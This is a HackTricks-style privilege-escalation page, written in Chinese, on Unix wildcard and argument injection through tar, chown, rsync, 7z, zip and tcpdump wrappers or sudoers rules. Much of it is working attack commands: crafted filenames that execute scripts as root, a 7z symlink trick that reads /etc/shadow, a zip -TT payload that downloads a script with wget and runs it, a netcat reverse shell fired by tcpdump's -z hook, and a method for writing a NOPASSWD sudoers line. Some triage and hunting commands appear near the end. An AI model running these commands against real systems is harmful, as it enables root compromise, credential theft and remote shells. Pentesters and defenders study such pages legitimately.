# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard（又称 *glob*）**argument injection** 发生在特权脚本使用 `tar`、`chown`、`rsync`、`zip`、`7z` 等 Unix 二进制程序，并搭配未加引号的通配符（如 `*`）时。
> 由于 shell 会在执行二进制程序**之前**展开通配符，能够在工作目录中创建文件的攻击者可以构造以 `-` 开头的文件名，使其被解释为**选项而非数据**，从而有效注入任意 flag，甚至命令。<sup>[[6]](#references)</sup>
> 本页面汇总了 2023-2025 年最有用的 primitives、最新研究和现代 detections。

## chown / chmod

当通配符展开出类似选项的文件名时，可以滥用 `--reference` flag，**从 reference file 复制 owner/group 或 permission bits**。<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
当 root 后续执行类似以下命令时：
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
展开的 `--reference=.drf.php` 会覆盖显式指定的 owner/mode，导致匹配的文件继承 `.drf.php` 的元数据（在上述设置下，还会使攻击者能够写入这些文件）。<sup>[[6]](#references)</sup>

*PoC 和工具*：[`wildpwn`](https://github.com/localh0t/wildpwn)（组合攻击）。<sup>[[7]](#references)</sup>  
另请参阅经典的 DefenseCode 论文以了解详情。<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

通过滥用 GNU tar 的 **checkpoint** 功能和 checkpoint 操作来执行任意命令。<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
一旦 root 运行例如 `tar -czf /root/backup.tgz *`，`shell.sh` 就会以 root 身份执行。<sup>[[10]](#references)</sup>

### bsdtar / macOS compressor override 注意事项

近期 macOS 上默认的 `tar`（基于 `libarchive`）不提供 GNU tar 的 `--checkpoint` 接口，但 bsdtar 文档说明了可使用 **--use-compress-program** 来选择外部 compressor。<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
当特权脚本运行 `tar -cf backup.tar *` 时，它会通过受害者的 `PATH` 选择 `sh`，然后 bsdtar 将其作为 compressor 启动。<sup>[[11]](#references)</sup> 这证明了 option injection，但其本身并不是可靠的 arbitrary-command primitive：由 wildcard 创建的文件名不能包含 `/`，而 bsdtar 提供的是 archive data，而不是攻击者选择的 shell command。要实现 code execution，还需要一个可控的 executable，该 executable 可通过 `PATH` 解析，或通过其他能够指定有用 program 的 argument channel 解析。

---

## rsync

`rsync` 允许通过 `-e` 和 `--rsync-path` 等 command-line flags 覆盖 remote shell 或 remote binary。<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
如果 root 随后使用 `rsync -az * backup:/srv/` 归档该目录，注入的 flag 可以通过 remote-shell 机制运行 shell。<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*：[`wildpwn`](https://github.com/localh0t/wildpwn)（`rsync` mode）。

---

## 7-Zip / 7z / 7za

即使特权脚本*主动防御性地*在 wildcard 前加上 `--`（以阻止 option parsing），7-Zip CLI 仍可通过在文件名​​前加上 `@` 来接受 **file list files**。将其与 symlink 结合，即可*exfiltrate 任意文件*。<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
如果 root 执行类似以下命令：
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip 会尝试将 `root.txt`（→ `/etc/shadow`）作为文件列表读取，然后退出，**并将其内容打印到 stderr**。<sup>[[13]](#references)</sup>

这可以绕过 `-- *`，因为 7-Zip CLI 明确接受普通文件名和 `@listfiles` 作为位置输入，因此像 `@root.txt` 这样的字面文件名仍会被特殊处理。<sup>[[13]](#references)</sup>

---

## zip

当应用程序通过 wildcard 或在不使用 `--` 的情况下枚举名称，并将用户可控的文件名传递给 `zip` 时，有两个非常实用的 primitive。<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook：`-T` 启用“test archive”，而 `-TT <cmd>` 会将 tester 替换为任意程序（长格式：`--unzip-command <cmd>`）。如果你可以注入以 `-` 开头的文件名，请将 flags 分散到不同的文件名中，以便 short-options parsing 正常工作。<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
注意事项
- 不要尝试使用单个文件名，例如 `'-T -TT <cmd>'` —— 短选项会按字符解析，因此会失败。请按照示例使用独立的 token。<sup>[[3]](#references)</sup>
- 如果应用会从文件名中移除斜杠，请从裸 host/IP 获取内容（默认路径为 `/index.html`），并使用 `-O` 保存到本地，然后执行。<sup>[[3]](#references)</sup>
- 可以使用 `-sc`（显示处理后的 argv）或 `-h2`（更多帮助）调试解析过程，以了解 token 的处理方式。<sup>[[3]](#references)</sup>

示例（zip 3.0 的本地行为）。<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak：如果 Web 层会回显 `zip` 的 stdout/stderr（naive wrappers 中很常见），注入的 flags（如 `--help`）或错误选项导致的失败信息就会出现在 HTTP 响应中，从而确认 command-line injection，并帮助调整 payload。<sup>[[3]](#references)</sup>

---

## Additional option-injection candidates

当 privileged wrapper 使用 wildcard 展开可写目录时，以下文档记录的 option hooks 值得检查。<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | 将 command string 传递给 shell |
| `git`   | `-c core.sshCommand=<cmd>` | 在 Git fetch/push 中使用 `<cmd>` 代替 SSH |
| `scp`   | `-S <program>` | 使用替代的 SSH-compatible connection program |

除了经典的 *tar/rsync/zip* 之外，这些 primitives 也适合用于检查。

---

## Hunting vulnerable wrappers and jobs

近期的 case studies 和 detection guidance 表明，wildcard/argv injection 已不再只是 **cron + tar** 问题。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> 同类 bug 仍持续出现在：

- 从 attacker-controlled upload directories 中“download everything as zip/tar”的 Web features
- vendor/appliance debug shells，它们暴露了带有 attacker-controlled filename/filter fields 的 **tcpdump** wrapper
- 在可写目录上调用 `tar`、`rsync`、`7z`、`zip`、`chown` 或 `chmod` 的 backup 或 rotation jobs

Useful triage commands（`pspy` invocation 使用其文档记录的 process/file-event 和 interval flags）。<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
快速判断：

- `-- *` 是许多 GNU 工具的有效修复方式，但**不适用于** `7z`/`7za`，因为 `@listfiles` 会被单独解析。<sup>[[13]](#references)</sup>
- 对于 `zip`，应查找会直接枚举用户可控文件名的 wrappers；即使没有 shell glob，短选项拆分（`-T` + `-TT <cmd>`）仍然有效。<sup>[[2]](#references)[[3]](#references)</sup>
- 对于 `tcpdump`，应特别关注允许你控制**输出文件名**、**轮转设置**或**捕获文件重放**参数的 wrappers。<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z)：通过 wrappers 中的 argv injection 实现 RCE

当受限 shell 或 vendor wrapper 通过拼接用户可控字段（例如“文件名”参数）来构建 `tcpdump` 命令行，且没有进行严格的 quoting/validation 时，你可以偷偷注入额外的 `tcpdump` flags。`-G`（基于时间的轮转）、`-W`（限制文件数量）与 `-z <cmd>`（轮转后的 command）组合使用时，可以以运行 tcpdump 的用户身份执行任意 command（在 appliances 上通常是 root）。<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

前提条件：

- 你可以影响传递给 `tcpdump` 的 `argv`（例如通过 `/debug/tcpdump --filter=... --file-name=<HERE>` 这样的 wrapper）。<sup>[[4]](#references)[[18]](#references)</sup>
- wrapper 不会清理文件名字段中的空格或以 `-` 开头的 tokens。<sup>[[4]](#references)</sup>

经典 PoC（从可写路径执行 reverse shell script）。<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1` 每秒轮换一次，`-W 1` 在生成一个轮换文件后停止；捕获必须先收到匹配的数据包，之后才会进行轮换。<sup>[[18]](#references)</sup>
- `-z <cmd>` 每次轮换执行一次 post-rotate command，并将已关闭的 savefile 路径作为参数传入；请确保 script/interpreter 的参数处理方式与 payload 相匹配。<sup>[[18]](#references)</sup>

No-removable-media 变体：

- 如果你有其他用于写入文件的 primitive（例如允许 output redirection 的独立 command wrapper），请将 script 放入已知路径，然后触发 `-z /path/script.sh`；如有需要，让 script 自行调用 `/bin/sh`。<sup>[[18]](#references)</sup>
- 如果某个 vendor wrapper 允许你选择轮换路径，请仅结合能够解析其 savefile 参数的 post-rotate command 审计该路径控制；单独的路径控制不会执行文件内容。<sup>[[18]](#references)</sup>

---

## sudoers：带 wildcards/additional args 的 tcpdump → arbitrary write/read 和 root

Example sudoers 反模式：<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
该规则在 tcpdump 的文档化 parser 中留下了多个可用选项：<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob 和宽松模式只限制第一个 `-w` 参数。`tcpdump` 接受多个 `-w` 选项；最后一个生效。<sup>[[3]](#references)[[18]](#references)</sup>
- 该规则未固定其他选项，因此允许使用 `-Z`、`-r`、`-V` 等。<sup>[[3]](#references)[[18]](#references)</sup>

相关 primitives 如下所述。<sup>[[3]](#references)[[18]](#references)</sup>
- 使用第二个 `-w` 覆盖目标路径（第一个仅用于满足 sudoers）。<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 在第一个 `-w` 中使用 Path traversal，以逃逸受限树结构。<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 使用 `-Z root` 强制设置输出文件所有权（可在任意位置创建由 root 拥有的文件）。<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 通过 `-r` 重放精心构造的 PCAP 来写入任意内容（例如，写入一行 sudoers 配置）。<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>创建包含确切 ASCII payload 的 PCAP，并以 root 身份写入</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 使用 `-V <file>` 可任意读取文件/导致 secret leak（将其解释为 savefiles 列表）。错误诊断通常会回显行内容，从而泄露数据。<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump：Zip 参数注入至 RCE + tcpdump sudo 配置错误提权](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - 完整 Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - 检测到通过 Wildcard Injection 获取 Shell 的潜在行为](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [回到未来：失控的 Unix Wildcards（DefenseCode）](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` 调用](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` 调用](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) 手册](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) 手册](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip 命令行语法](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) 手册](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git 配置文档](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` 手册](https://man.openbsd.org/scp)
- [18] [tcpdump(8) 手册](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
